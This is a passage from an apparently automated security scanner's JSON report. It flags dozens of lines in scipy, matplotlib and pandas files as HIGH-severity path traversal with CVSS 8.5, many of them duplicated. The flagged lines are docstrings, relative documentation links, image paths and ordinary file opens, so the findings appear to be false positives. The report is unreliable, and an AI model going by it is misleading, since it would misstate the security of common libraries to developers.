            "evidence": "i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"",
            "context": "    \"\"\"Return a list of parsed link headers proxies.\n\n    i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"\n\n    :rtype: list",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/integrate/_quadpack_py.py",
            "line": 405,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "lib = ctypes.CDLL('/home/.../testlib.*') #use absolute path",
            "context": "       from scipy import integrate\n       import ctypes\n       lib = ctypes.CDLL('/home/.../testlib.*') #use absolute path\n       lib.func.restype = ctypes.c_double\n       lib.func.argtypes = (ctypes.c_int,ctypes.c_double)",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/integrate/_quadpack_py.py",
            "line": 405,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "lib = ctypes.CDLL('/home/.../testlib.*') #use absolute path",
            "context": "       from scipy import integrate\n       import ctypes\n       lib = ctypes.CDLL('/home/.../testlib.*') #use absolute path\n       lib.func.restype = ctypes.c_double\n       lib.func.argtypes = (ctypes.c_int,ctypes.c_double)",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/io/_idl.py",
            "line": 776,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "fout = open(uncompressed_file_name, 'w+b')",
            "context": "\n        if uncompressed_file_name:\n            fout = open(uncompressed_file_name, 'w+b')\n        else:\n            fout = tempfile.NamedTemporaryFile(suffix='.sav')",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/special/_precompute/gammainc_asy.py",
            "line": 101,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(fn + '.new', 'w') as f:",
            "context": "        d = compute_d(K, N)\n    fn = os.path.join(os.path.dirname(__file__), '..', 'cephes', 'igam.h')\n    with open(fn + '.new', 'w') as f:\n        f.write(header.format(K, N))\n        for k, row in enumerate(d):",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/special/_precompute/expn_asy.py",
            "line": 40,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(fn + '.new', 'w') as f:",
            "context": "    K = 12\n    A = generate_A(K)\n    with open(fn + '.new', 'w') as f:\n        f.write(WARNING)\n        f.write(f\"#define nA {len(A)}\\n\")",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/io/tests/test_netcdf.py",
            "line": 125,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open('simple.nc', 'r+b') as fobj:",
            "context": "\n        # Again read it in append mode (adding another att)\n        with open('simple.nc', 'r+b') as fobj:\n            with netcdf_file(fobj, 'a') as f:\n                assert_(not f.use_mmap)",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/io/tests/test_fortran.py",
            "line": 224,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(filename, \"w+b\") as f:",
            "context": "        f.write_record(rng.randn(5))\n        f.write_record(rng.randn(3))\n    with open(filename, \"w+b\") as f:\n        f.write(b\"\\xff\\xff\")\n    with FortranFile(filename, 'r') as f:",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/tests/test_sphinxext.py",
            "line": 221,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "st = ('srcset=\"../_images/nestedpage-index-1.png, '",
            "context": "            in (html_dir / 'some_plots.html').read_text(encoding='utf-8'))\n\n    st = ('srcset=\"../_images/nestedpage-index-1.png, '\n          '../_images/nestedpage-index-1.2x.png 2.00x\"')\n    assert st in (html_dir / 'nestedpage/index.html').read_text(encoding='utf-8')",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/tests/test_sphinxext.py",
            "line": 221,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "st = ('srcset=\"../_images/nestedpage-index-1.png, '",
            "context": "            in (html_dir / 'some_plots.html').read_text(encoding='utf-8'))\n\n    st = ('srcset=\"../_images/nestedpage-index-1.png, '\n          '../_images/nestedpage-index-1.2x.png 2.00x\"')\n    assert st in (html_dir / 'nestedpage/index.html').read_text(encoding='utf-8')",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/tests/test_sphinxext.py",
            "line": 222,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'../_images/nestedpage-index-1.2x.png 2.00x\"')",
            "context": "\n    st = ('srcset=\"../_images/nestedpage-index-1.png, '\n          '../_images/nestedpage-index-1.2x.png 2.00x\"')\n    assert st in (html_dir / 'nestedpage/index.html').read_text(encoding='utf-8')\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/tests/test_sphinxext.py",
            "line": 222,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'../_images/nestedpage-index-1.2x.png 2.00x\"')",
            "context": "\n    st = ('srcset=\"../_images/nestedpage-index-1.png, '\n          '../_images/nestedpage-index-1.2x.png 2.00x\"')\n    assert st in (html_dir / 'nestedpage/index.html').read_text(encoding='utf-8')\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/tests/test_sphinxext.py",
            "line": 225,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "st = ('srcset=\"../_images/nestedpage2-index-2.png, '",
            "context": "    assert st in (html_dir / 'nestedpage/index.html').read_text(encoding='utf-8')\n\n    st = ('srcset=\"../_images/nestedpage2-index-2.png, '\n          '../_images/nestedpage2-index-2.2x.png 2.00x\"')\n    assert st in (html_dir / 'nestedpage2/index.html').read_text(encoding='utf-8')",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/tests/test_sphinxext.py",
            "line": 225,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "st = ('srcset=\"../_images/nestedpage2-index-2.png, '",
            "context": "    assert st in (html_dir / 'nestedpage/index.html').read_text(encoding='utf-8')\n\n    st = ('srcset=\"../_images/nestedpage2-index-2.png, '\n          '../_images/nestedpage2-index-2.2x.png 2.00x\"')\n    assert st in (html_dir / 'nestedpage2/index.html').read_text(encoding='utf-8')",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/tests/test_sphinxext.py",
            "line": 226,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'../_images/nestedpage2-index-2.2x.png 2.00x\"')",
            "context": "\n    st = ('srcset=\"../_images/nestedpage2-index-2.png, '\n          '../_images/nestedpage2-index-2.2x.png 2.00x\"')\n    assert st in (html_dir / 'nestedpage2/index.html').read_text(encoding='utf-8')\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/tests/test_sphinxext.py",
            "line": 226,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'../_images/nestedpage2-index-2.2x.png 2.00x\"')",
            "context": "\n    st = ('srcset=\"../_images/nestedpage2-index-2.png, '\n          '../_images/nestedpage2-index-2.2x.png 2.00x\"')\n    assert st in (html_dir / 'nestedpage2/index.html').read_text(encoding='utf-8')\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/tests/test_pyplot.py",
            "line": 366,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "pyplot_docs = Path(__file__).parent / '../../../doc/api/pyplot_summary.rst'",
            "context": "def test_doc_pyplot_summary():\n    \"\"\"Test that pyplot_summary lists all the plot functions.\"\"\"\n    pyplot_docs = Path(__file__).parent / '../../../doc/api/pyplot_summary.rst'\n    if not pyplot_docs.exists():\n        pytest.skip(\"Documentation sources not available\")",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/tests/test_pyplot.py",
            "line": 366,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "pyplot_docs = Path(__file__).parent / '../../../doc/api/pyplot_summary.rst'",
            "context": "def test_doc_pyplot_summary():\n    \"\"\"Test that pyplot_summary lists all the plot functions.\"\"\"\n    pyplot_docs = Path(__file__).parent / '../../../doc/api/pyplot_summary.rst'\n    if not pyplot_docs.exists():\n        pytest.skip(\"Documentation sources not available\")",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/tests/test_pyplot.py",
            "line": 366,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "pyplot_docs = Path(__file__).parent / '../../../doc/api/pyplot_summary.rst'",
            "context": "def test_doc_pyplot_summary():\n    \"\"\"Test that pyplot_summary lists all the plot functions.\"\"\"\n    pyplot_docs = Path(__file__).parent / '../../../doc/api/pyplot_summary.rst'\n    if not pyplot_docs.exists():\n        pytest.skip(\"Documentation sources not available\")",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/tests/test_pyplot.py",
            "line": 366,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "pyplot_docs = Path(__file__).parent / '../../../doc/api/pyplot_summary.rst'",
            "context": "def test_doc_pyplot_summary():\n    \"\"\"Test that pyplot_summary lists all the plot functions.\"\"\"\n    pyplot_docs = Path(__file__).parent / '../../../doc/api/pyplot_summary.rst'\n    if not pyplot_docs.exists():\n        pytest.skip(\"Documentation sources not available\")",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/tests/test_pyplot.py",
            "line": 366,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "pyplot_docs = Path(__file__).parent / '../../../doc/api/pyplot_summary.rst'",
            "context": "def test_doc_pyplot_summary():\n    \"\"\"Test that pyplot_summary lists all the plot functions.\"\"\"\n    pyplot_docs = Path(__file__).parent / '../../../doc/api/pyplot_summary.rst'\n    if not pyplot_docs.exists():\n        pytest.skip(\"Documentation sources not available\")",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/tests/test_pyplot.py",
            "line": 366,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "pyplot_docs = Path(__file__).parent / '../../../doc/api/pyplot_summary.rst'",
            "context": "def test_doc_pyplot_summary():\n    \"\"\"Test that pyplot_summary lists all the plot functions.\"\"\"\n    pyplot_docs = Path(__file__).parent / '../../../doc/api/pyplot_summary.rst'\n    if not pyplot_docs.exists():\n        pytest.skip(\"Documentation sources not available\")",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/sphinxext/figmpl_directive.py",
            "line": 66,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "<img src=\"../_images/nestedpage-index-1.png\"",
            "context": "    The resulting html (at ``nestedpage/index.html``)::\n\n        <img src=\"../_images/nestedpage-index-1.png\"\n            srcset=\"../_images/nestedpage-index-1.png,\n                    ../_images/_images/nestedpage-index-1.2x.png 2.00x\",",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/sphinxext/figmpl_directive.py",
            "line": 66,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "<img src=\"../_images/nestedpage-index-1.png\"",
            "context": "    The resulting html (at ``nestedpage/index.html``)::\n\n        <img src=\"../_images/nestedpage-index-1.png\"\n            srcset=\"../_images/nestedpage-index-1.png,\n                    ../_images/_images/nestedpage-index-1.2x.png 2.00x\",",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/sphinxext/figmpl_directive.py",
            "line": 67,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "srcset=\"../_images/nestedpage-index-1.png,",
            "context": "\n        <img src=\"../_images/nestedpage-index-1.png\"\n            srcset=\"../_images/nestedpage-index-1.png,\n                    ../_images/_images/nestedpage-index-1.2x.png 2.00x\",\n            alt=\"bar\"",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/sphinxext/figmpl_directive.py",
            "line": 67,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "srcset=\"../_images/nestedpage-index-1.png,",
            "context": "\n        <img src=\"../_images/nestedpage-index-1.png\"\n            srcset=\"../_images/nestedpage-index-1.png,\n                    ../_images/_images/nestedpage-index-1.2x.png 2.00x\",\n            alt=\"bar\"",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/sphinxext/figmpl_directive.py",
            "line": 68,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "../_images/_images/nestedpage-index-1.2x.png 2.00x\",",
            "context": "        <img src=\"../_images/nestedpage-index-1.png\"\n            srcset=\"../_images/nestedpage-index-1.png,\n                    ../_images/_images/nestedpage-index-1.2x.png 2.00x\",\n            alt=\"bar\"\n            class=\"sphx-glr-single-img\" />",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/sphinxext/figmpl_directive.py",
            "line": 68,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "../_images/_images/nestedpage-index-1.2x.png 2.00x\",",
            "context": "        <img src=\"../_images/nestedpage-index-1.png\"\n            srcset=\"../_images/nestedpage-index-1.png,\n                    ../_images/_images/nestedpage-index-1.2x.png 2.00x\",\n            alt=\"bar\"\n            class=\"sphx-glr-single-img\" />",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/sphinxext/figmpl_directive.py",
            "line": 134,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "# ../../../build/html/plot_directive/users/explain/artists/index-1.png",
            "context": "\n    # these will be the temporary place the plot-directive put the images eg:\n    # ../../../build/html/plot_directive/users/explain/artists/index-1.png\n    if node['srcset']:\n        srcset = _parse_srcsetNodes(node['srcset'])",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/sphinxext/figmpl_directive.py",
            "line": 134,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "# ../../../build/html/plot_directive/users/explain/artists/index-1.png",
            "context": "\n    # these will be the temporary place the plot-directive put the images eg:\n    # ../../../build/html/plot_directive/users/explain/artists/index-1.png\n    if node['srcset']:\n        srcset = _parse_srcsetNodes(node['srcset'])",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/sphinxext/figmpl_directive.py",
            "line": 134,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "# ../../../build/html/plot_directive/users/explain/artists/index-1.png",
            "context": "\n    # these will be the temporary place the plot-directive put the images eg:\n    # ../../../build/html/plot_directive/users/explain/artists/index-1.png\n    if node['srcset']:\n        srcset = _parse_srcsetNodes(node['srcset'])",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/sphinxext/figmpl_directive.py",
            "line": 134,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "# ../../../build/html/plot_directive/users/explain/artists/index-1.png",
            "context": "\n    # these will be the temporary place the plot-directive put the images eg:\n    # ../../../build/html/plot_directive/users/explain/artists/index-1.png\n    if node['srcset']:\n        srcset = _parse_srcsetNodes(node['srcset'])",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/sphinxext/figmpl_directive.py",
            "line": 134,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "# ../../../build/html/plot_directive/users/explain/artists/index-1.png",
            "context": "\n    # these will be the temporary place the plot-directive put the images eg:\n    # ../../../build/html/plot_directive/users/explain/artists/index-1.png\n    if node['srcset']:\n        srcset = _parse_srcsetNodes(node['srcset'])",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/sphinxext/figmpl_directive.py",
            "line": 134,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "# ../../../build/html/plot_directive/users/explain/artists/index-1.png",
            "context": "\n    # these will be the temporary place the plot-directive put the images eg:\n    # ../../../build/html/plot_directive/users/explain/artists/index-1.png\n    if node['srcset']:\n        srcset = _parse_srcsetNodes(node['srcset'])",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/sphinxext/figmpl_directive.py",
            "line": 186,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "# ../../_images/ for dirhtml and ../_images/ for html",
            "context": "    dest = desttop / relsource\n\n    # ../../_images/ for dirhtml and ../_images/ for html\n    imagerel = PurePath(relpath(imagedir, dest.parent)).as_posix()\n    if self.builder.name == \"dirhtml\":",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/sphinxext/figmpl_directive.py",
            "line": 186,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "# ../../_images/ for dirhtml and ../_images/ for html",
            "context": "    dest = desttop / relsource\n\n    # ../../_images/ for dirhtml and ../_images/ for html\n    imagerel = PurePath(relpath(imagedir, dest.parent)).as_posix()\n    if self.builder.name == \"dirhtml\":",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/sphinxext/figmpl_directive.py",
            "line": 186,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "# ../../_images/ for dirhtml and ../_images/ for html",
            "context": "    dest = desttop / relsource\n\n    # ../../_images/ for dirhtml and ../_images/ for html\n    imagerel = PurePath(relpath(imagedir, dest.parent)).as_posix()\n    if self.builder.name == \"dirhtml\":",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/sphinxext/figmpl_directive.py",
            "line": 186,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "# ../../_images/ for dirhtml and ../_images/ for html",
            "context": "    dest = desttop / relsource\n\n    # ../../_images/ for dirhtml and ../_images/ for html\n    imagerel = PurePath(relpath(imagedir, dest.parent)).as_posix()\n    if self.builder.name == \"dirhtml\":",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/sphinxext/figmpl_directive.py",
            "line": 186,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "# ../../_images/ for dirhtml and ../_images/ for html",
            "context": "    dest = desttop / relsource\n\n    # ../../_images/ for dirhtml and ../_images/ for html\n    imagerel = PurePath(relpath(imagedir, dest.parent)).as_posix()\n    if self.builder.name == \"dirhtml\":",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/sphinxext/figmpl_directive.py",
            "line": 186,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "# ../../_images/ for dirhtml and ../_images/ for html",
            "context": "    dest = desttop / relsource\n\n    # ../../_images/ for dirhtml and ../_images/ for html\n    imagerel = PurePath(relpath(imagedir, dest.parent)).as_posix()\n    if self.builder.name == \"dirhtml\":",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/sphinxext/figmpl_directive.py",
            "line": 203,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "# ../../_images/plot_1_2_0x.png",
            "context": "        for mult, src in srcset.items():\n            nm = PurePath(src[1:]).name\n            # ../../_images/plot_1_2_0x.png\n            path = f'{imagerel}/{rel}{nm}'\n            srcsetst += path",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/sphinxext/figmpl_directive.py",
            "line": 203,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "# ../../_images/plot_1_2_0x.png",
            "context": "        for mult, src in srcset.items():\n            nm = PurePath(src[1:]).name\n            # ../../_images/plot_1_2_0x.png\n            path = f'{imagerel}/{rel}{nm}'\n            srcsetst += path",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/sphinxext/figmpl_directive.py",
            "line": 203,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "# ../../_images/plot_1_2_0x.png",
            "context": "        for mult, src in srcset.items():\n            nm = PurePath(src[1:]).name\n            # ../../_images/plot_1_2_0x.png\n            path = f'{imagerel}/{rel}{nm}'\n            srcsetst += path",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/sphinxext/figmpl_directive.py",
            "line": 203,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "# ../../_images/plot_1_2_0x.png",
            "context": "        for mult, src in srcset.items():\n            nm = PurePath(src[1:]).name\n            # ../../_images/plot_1_2_0x.png\n            path = f'{imagerel}/{rel}{nm}'\n            srcsetst += path",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/frame.py",
            "line": 1440,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see\n        `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n        # Raise AttributeError so that inspect works even if jinja2 is not installed.",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/frame.py",
            "line": 1440,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see\n        `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n        # Raise AttributeError so that inspect works even if jinja2 is not installed.",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/frame.py",
            "line": 1440,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see\n        `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n        # Raise AttributeError so that inspect works even if jinja2 is not installed.",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/frame.py",
            "line": 1440,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see\n        `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n        # Raise AttributeError so that inspect works even if jinja2 is not installed.",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style_render.py",
            "line": 1174,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/format_excel_css.png",
            "context": "        >>> df.style.map(lambda v: pseudo_css).to_excel(filename) # doctest: +SKIP\n\n        .. figure:: ../../_static/style/format_excel_css.png\n        \"\"\"\n        if all(",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style_render.py",
            "line": 1174,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/format_excel_css.png",
            "context": "        >>> df.style.map(lambda v: pseudo_css).to_excel(filename) # doctest: +SKIP\n\n        .. figure:: ../../_static/style/format_excel_css.png\n        \"\"\"\n        if all(",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style_render.py",
            "line": 1174,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/format_excel_css.png",
            "context": "        >>> df.style.map(lambda v: pseudo_css).to_excel(filename) # doctest: +SKIP\n\n        .. figure:: ../../_static/style/format_excel_css.png\n        \"\"\"\n        if all(",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style_render.py",
            "line": 1174,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/format_excel_css.png",
            "context": "        >>> df.style.map(lambda v: pseudo_css).to_excel(filename) # doctest: +SKIP\n\n        .. figure:: ../../_static/style/format_excel_css.png\n        \"\"\"\n        if all(",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 250,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n    Please see:\n    `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n    \"\"\"\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 250,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n    Please see:\n    `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n    \"\"\"\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 250,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n    Please see:\n    `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n    \"\"\"\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 250,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n    Please see:\n    `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n    \"\"\"\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 359,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/footer_simple.png",
            "context": "        >>> styler = df.style.concat(df.agg([\"sum\"]).style)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/footer_simple.png\n\n        Since the concatenated object is a Styler the existing functionality can be",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 359,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/footer_simple.png",
            "context": "        >>> styler = df.style.concat(df.agg([\"sum\"]).style)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/footer_simple.png\n\n        Since the concatenated object is a Styler the existing functionality can be",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 359,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/footer_simple.png",
            "context": "        >>> styler = df.style.concat(df.agg([\"sum\"]).style)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/footer_simple.png\n\n        Since the concatenated object is a Styler the existing functionality can be",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 359,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
